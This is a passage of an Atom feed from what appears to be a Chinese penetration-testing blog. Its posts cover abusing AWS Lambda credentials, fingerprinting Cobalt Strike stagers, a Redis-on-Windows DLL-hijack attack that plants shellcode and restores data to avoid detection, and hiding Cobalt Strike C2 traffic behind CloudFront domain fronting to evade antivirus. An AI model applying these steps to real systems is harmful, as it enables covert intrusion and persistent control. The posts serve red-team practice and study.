&lt;li&gt;默认用户: &lt;code&gt;sbx_userxxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右&lt;/li&gt;
&lt;li&gt;攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在存在命令执行的情况下先获取用户凭证，然后使用&lt;code&gt;awscli&lt;/code&gt;写入本地配置文件里面，通过&lt;code&gt;awscli&lt;/code&gt;来操作，如果在创建&lt;code&gt;Lambda&lt;/code&gt;的权限控制不足，这个时候就可以使用&lt;code&gt;awscli&lt;/code&gt;来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。&lt;/p&gt;
&lt;p&gt;存在另外一种情况，当获取到的凭证权限很小的时候，到处都是&lt;code&gt;is not authorized to perform&lt;/code&gt;，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike的Stager特征隐藏</title>
    <link href="https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html"/>
    <id>https://jkme.github.io/2021/01/04/CloudFront-find-cobaltstrike.html</id>
    <published>2021-01-03T16:00:00.000Z</published>
    <updated>2022-01-21T02:37:52.292Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p><p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p><h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p><h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p><pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_subject</span><span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> <span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dst<span class="token punctuation">)</span>        ctx <span class="token operator">=</span> ssl<span class="token punctuation">.</span>create_default_context<span class="token punctuation">(</span><span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>check_hostname <span class="token operator">=</span> <span class="token boolean">False</span>        ctx<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE        s <span class="token operator">=</span> ctx<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> server_hostname<span class="token operator">=</span>dst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cert_bin <span class="token operator">=</span> s<span class="token punctuation">.</span>getpeercert<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        x509 <span class="token operator">=</span> crypto<span class="token punctuation">.</span>load_certificate<span class="token punctuation">(</span>crypto<span class="token punctuation">.</span>FILETYPE_ASN1<span class="token punctuation">,</span> cert_bin<span class="token punctuation">)</span>        val <span class="token operator">=</span> x509<span class="token punctuation">.</span>get_subject<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CN    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        val <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> val<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="扫描结果"><a href="#扫描结果" class="headerlink" title="扫描结果"></a>扫描结果</h3><ul><li>最多使用的<code>GET URI</code>是<code>submit.php</code></li><li>除了aws的<code>CloudFront</code>作为最多的域前置，还有使用<code>API Gateway</code>，猜测使用了https流量转发或者直接接入到网关。</li><li>还有使用了巨硬家的域名，那这种就是<code>Domain takeover</code>来获取到的</li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>如果是使用了AWS家的<code>CloudFront</code>作为域前置，可以设置防火墙规则，只允许属于<code>CloudFront</code>的域名流量，其他IP请求过来的流量丢掉，操作如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x01:  获取到CloudFront的所有IPhttp http://d7uri8nf7uskq.cloudfront.net/tools/list-cloudfront-ips <span class="token operator">|</span>jq <span class="token string">".[][]"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/"//g'</span> <span class="token operator">|</span> <span class="token function">tee</span> /tmp/cloud.txt0x02: 使用ipset新增IP集合ipset create cloudfront hash:net<span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> ipset <span class="token function">add</span> cloudfront <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&lt;</span> /tmp/cloud.txtipset list cloudfront0x03: 新增IPtables规则iptables -A INPUT -p tcp  --dport <span class="token number">443</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set cloudfront  src -p tcp  --dport <span class="token number">443</span> -j ACCEPT0x04: 同理对teamserver端口进行规则设置ipset create teamserver hash:ipipset <span class="token function">add</span> teamserver <span class="token number">1.2</span>.3.4iptables -A INPUT -p tcp  --dport <span class="token number">50050</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j ACCEPT上面两个iptables规则可以合并一条：iptables -I INPUT -m <span class="token builtin class-name">set</span> <span class="token operator">!</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j DROP0x05: ipset常见命令ipset del teamserver <span class="token number">1.2</span>.3.4  <span class="token comment">#从teamserver中删除某IP</span>ipset list teamserver <span class="token comment"># 查看teamserver集合内容</span>ipset flush teamserver <span class="token comment"># 清空teamserver内容</span>ipset flush  <span class="token comment"># 清空所有</span>ipset destroy teamserver  <span class="token comment"># 销毁teamserver</span>ipset destroy <span class="token comment"># 销毁所有</span>0x06: iptables删除规则<span class="token comment"># 显示规则</span>iptables -L INPUT --line-numbers <span class="token comment"># 删除规则</span>iptables -D INPUT <span class="token operator">&lt;</span>num<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，也可以直接修改CS的源代码重新打包。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>IPSET设置白名单之后，会对CS的设置VPN功能有影响。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A">浅析CobaltStrike Beacon Staging Server扫描</a></li><li><a href="https://www.cnblogs.com/donot/p/14226788.html">针对CobaltStrike中出现的Stager监听端口特征后门分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;在github上面出现一个仓库分析&lt;code&gt;CobaltStrike&lt;/code&gt;监听端口的特征：&lt;a href=&quot;https://github.com/Te-k/cobaltstrike&quot;&gt;https://github.com/Te-k/cobaltstrike&lt;/a&gt;。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/01/04/CloudFront-find-cobaltstrike/360.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;找到DomainFront&quot;&gt;&lt;a href=&quot;#找到DomainFront&quot; class=&quot;headerlink&quot; title=&quot;找到DomainFront&quot;&gt;&lt;/a&gt;找到DomainFront&lt;/h3&gt;&lt;p&gt;根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2&lt;br&gt;的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)&lt;/p&gt;
&lt;h4 id=&quot;Quake测绘&quot;&gt;&lt;a href=&quot;#Quake测绘&quot; class=&quot;headerlink&quot; title=&quot;Quake测绘&quot;&gt;&lt;/a&gt;Quake测绘&lt;/h4&gt;&lt;p&gt;根据360给出的搜索条件，先找出来一批IP地址:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;response:&amp;quot;HTTP&amp;#x2F;1.1 404 Not Found&amp;quot; AND response:&amp;quot;Content-Type: text&amp;#x2F;plain&amp;quot; AND response:&amp;quot;Content-Length: 0&amp;quot; AND NOT response:&amp;quot;Server: &amp;quot; AND NOT response:&amp;quot;Connection: &amp;quot; AND port: &amp;quot;443&amp;quot;   AND NOT country: &amp;quot;China&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;修改脚本&quot;&gt;&lt;a href=&quot;#修改脚本&quot; class=&quot;headerlink&quot; title=&quot;修改脚本&quot;&gt;&lt;/a&gt;修改脚本&lt;/h4&gt;&lt;p&gt;修改好之后的脚本和扫描结果:&lt;a href=&quot;https://github.com/JKme/cobaltstrike&quot;&gt;https://github.com/JKme/cobaltstrike&lt;/a&gt;。把单线程改为多线程，再增加一个获取IP的https证书域名函数：&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis On Windows -- Dll Hijack</title>
    <link href="https://jkme.github.io/2020/09/10/redis-windows-hijack.html"/>
    <id>https://jkme.github.io/2020/09/10/redis-windows-hijack.html</id>
    <published>2020-09-09T16:00:00.000Z</published>
    <updated>2022-01-21T02:57:53.265Z</updated>
    
    <content type="html"><![CDATA[<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当<code>redis-server.exe</code>启动的时候，有如下:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dllC:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最终在Redis目录下可以利用的有两个:<code>cryptbase.dll</code>和<code>dbghelp.dll</code>。如果是权限持久性控制，两个都可以，这里我们选择主动攻击，所以使用<code>dbghelp.dll</code>。</p><p>###DLLHijacker</p><p>使用kiwings师傅的<a href="https://github.com/kiwings/DLLHijacker">DLLHijacker</a>，因为在系统里面是存在<code>C:\Windows\System32\dbghelp.dll</code>的，所以，复制出来之后，运行脚本，生成DLL工程项目。修改里面的shellcode和dbghelp.dll的绝对路径。</p><p>在实际测试的时候，运行脚本报错，所以修改了一部分代码: <a href="https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack">https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack</a></p><p>把生成的dll重命名为<code>dghelp.dll</code>放在redis的安装目录，然后执行<code>bgsave</code>或者<code>redis-server</code>启动的时候会执行shellcode。</p><p><img src="/2020/09/10/redis-windows-hijack/WX20200910.png"></p><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>在实际的渗透测试中，使用<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>写入文件的时候，因为使用的是主从复制，会把redis里面的数据清空，这样攻击之后可能会被发现，所以可以这样做:</p><h5 id="备份redis"><a href="#备份redis" class="headerlink" title="备份redis"></a>备份redis</h5><ul><li><a href="https://github.com/yannh/redis-dump-go">redis-dump-go</a></li></ul><pre class="line-numbers language-none"><code class="language-none">备份:.&#x2F;redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump恢复:redis-cli -h 192.168.2.233 &lt; redis.dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>准备好dll，使用<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>写入</li><li>备份Redis: <code>./redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump</code></li><li>执行<code>bgsave</code>,获取Shell</li><li>恢复Redis: <code>redis-cli -h 192.168.2.233 &lt; redis.dump</code></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: &lt;a href=&quot;https://xz.aliyun.com/t/8153&quot;&gt;Redis on Windows 出网利用探索&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Redis-x64-3.2.100
Win10&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;可劫持的DLL&quot;&gt;&lt;a href=&quot;#可劫持的DLL&quot; class=&quot;headerlink&quot; title=&quot;可劫持的DLL&quot;&gt;&lt;/a&gt;可劫持的DLL&lt;/h3&gt;&lt;p&gt;按照文章中使用&lt;code&gt;Process Monitor&lt;/code&gt;，在使用&lt;code&gt;redis-cli&lt;/code&gt;操作的时候，观察缺失的DLL。在&lt;code&gt;Process Monitor Filter&lt;/code&gt;里面设置&lt;code&gt;Image Path&lt;/code&gt;的值为&lt;code&gt;redis-server.exe&lt;/code&gt;的路径，比如我的是&lt;code&gt;C:\Program Files\Redis\redis-server.exe&lt;/code&gt;，&lt;code&gt;Path&lt;/code&gt;设置为&lt;code&gt;ends with dll&lt;/code&gt;。设置好之后，使用&lt;code&gt;redis-cli&lt;/code&gt;连接，执行&lt;code&gt;bgsave&lt;/code&gt;命令，然后观察缺失的dll，有如下:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;当&lt;code&gt;redis-server.exe&lt;/code&gt;启动的时候，有如下:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;执行&lt;code&gt;BGREWRITEAOF&lt;/code&gt;的时候，有如下:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Domain Fronting隐藏HTTPS</title>
    <link href="https://jkme.github.io/2020/08/28/CloudFront-Https.html"/>
    <id>https://jkme.github.io/2020/08/28/CloudFront-Https.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:41:29.241Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p><p>###目标</p><ol><li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li><li>AWS的<code>Cloudfront</code>作为前置域名</li></ol><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.comVPS(Centos)cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p><pre class="line-numbers language-none"><code class="language-none">yum install httpdsystemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf&lt;VirtualHost *:80&gt;   DocumentRoot &#x2F;var&#x2F;www&#x2F;html   ServerName example.comRewriteEngine onRewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.comRewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置https"><a href="#设置https" class="headerlink" title="设置https"></a>设置https</h4><p>运行脚本<code>HTTPsC2DoneRight.sh</code>生成对应需要的文件，比如<code>letsencrypt</code>、<code>amazon.profile</code>等文件，这个时候https会自动设置成功，测试如下:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;example.comcurl https:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这时候会生成https通信需要的证书文件，一般是通过自签名Letsencrypt申请下来的：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;letsencrypt-auto certonly --standalone -d 域名 --email 邮箱（可匿名）openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out pkcs.p12 -name 域名 -passout pass:ABcd123456keytool -importkeystore -deststorepass ABcd123456 -destkeypass ABcd123456 -destkeystore keystore.store -srckeystore pkcs.p12 -srcstoretype PKCS12 -srcstorepass ABcd123456 -alias 域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的keystore是后面设置CS配置文件的时候使用。</p><h4 id="设置CloudFront"><a href="#设置CloudFront" class="headerlink" title="设置CloudFront"></a>设置CloudFront</h4><p>标红的点特别注意，要改成这个样子，否则测试失败。更改之后发布，测试此时的<code>CloudFront</code>是否生效:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;&lt;example&gt;.cloudfront.netcurl http:&#x2F;&#x2F;&lt;example&gt;.cloudfront.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/28/CloudFront-Https/WX20200828-01.png"></p><h4 id="设置Profile"><a href="#设置Profile" class="headerlink" title="设置Profile"></a>设置Profile</h4><p>生成Profile，上面生成的<code>amazon.profile</code>测试上线失败。</p><pre class="line-numbers language-none"><code class="language-none">cd &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;bluscreenofjeff&#x2F;Malleable-C2-Randomizer &amp;&amp; cd Malleable-C2-Randomizerpython malleable-c2-randomizer.py -profile Sample\ Templates&#x2F;Pandora.profile -notestcp pandora_&lt;random&gt;.profile &#x2F;root&#x2F;cobaltstrike&#x2F;httpsProfile&#x2F; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="修改profile"><a href="#修改profile" class="headerlink" title="修改profile"></a>修改profile</h4><ol><li>把amazon.profile的最后四行设置https的添加到pandora_<random>.profile里面。</random></li><li>修改<code>pandora_&lt;random.profile</code>里面的<code>Host</code>，改为aws申请下来的加速域名。</li><li>在profile文件最后新增配置：</li></ol><pre class="line-numbers language-none"><code class="language-none">https-certificate &#123;set keystore &quot;keystore.store&quot;;set password &quot;1234565&quot;;&#125;http-config &#123;set trust_x_forwarded_for &quot;true&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置CS"><a href="#设置CS" class="headerlink" title="设置CS"></a>设置CS</h4><pre class="line-numbers language-none"><code class="language-none">systemctl stop httpd  &#x2F;&#x2F;关闭apache.&#x2F;teamserver &lt;IP&gt; &lt;Pass&gt; &lt;path to pandora profile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>新建一个listener:</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-02.png"></p><p>查看CS的<code>WEBlog</code>:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;cloudfront.net&#x2F;Hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在weblog里面查看到对应的请求即设置成功。</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-03.png"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/">https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/</a></li><li><a href="https://www.cnblogs.com/donot/p/13921874.html">Domain Fronted仍然是最佳的C2隐藏手段</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一下当使用&lt;code&gt;Domain Fronting&lt;/code&gt;中使用&lt;code&gt;https&lt;/code&gt;来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为&lt;code&gt;node32&lt;/code&gt;对http的流量很敏感。&lt;/p&gt;
&lt;p&gt;###目标&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;code&gt;Windows/beacon_https/reverse_https&lt;/code&gt;作为上线的payload&lt;/li&gt;
&lt;li&gt;AWS的&lt;code&gt;Cloudfront&lt;/code&gt;作为前置域名&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;域名: example.com
VPS(Centos)
cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h2 id=&quot;部署工作&quot;&gt;&lt;a href=&quot;#部署工作&quot; class=&quot;headerlink&quot; title=&quot;部署工作&quot;&gt;&lt;/a&gt;部署工作&lt;/h2&gt;&lt;p&gt;安装的apache是测试连通性，除此之外没有任何用处。&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;yum install httpd
systemctl start httpd&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;增加apache配置文件&quot;&gt;&lt;a href=&quot;#增加apache配置文件&quot; class=&quot;headerlink&quot; title=&quot;增加apache配置文件&quot;&gt;&lt;/a&gt;增加apache配置文件&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#&amp;#x2F;etc&amp;#x2F;httpd&amp;#x2F;conf.d&amp;#x2F;vhost.conf
&amp;lt;VirtualHost *:80&amp;gt;
   DocumentRoot &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&amp;#123;SERVER_NAME&amp;#125; &amp;#x3D;example.com
RewriteRule ^ https:&amp;#x2F;&amp;#x2F;%&amp;#123;SERVER_NAME&amp;#125;%&amp;#123;REQUEST_URI&amp;#125; [END,NE,R&amp;#x3D;permanent]
&amp;lt;&amp;#x2F;VirtualHost&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows后门隐藏</title>
    <link href="https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html"/>
    <id>https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:26:43.177Z</updated>
    
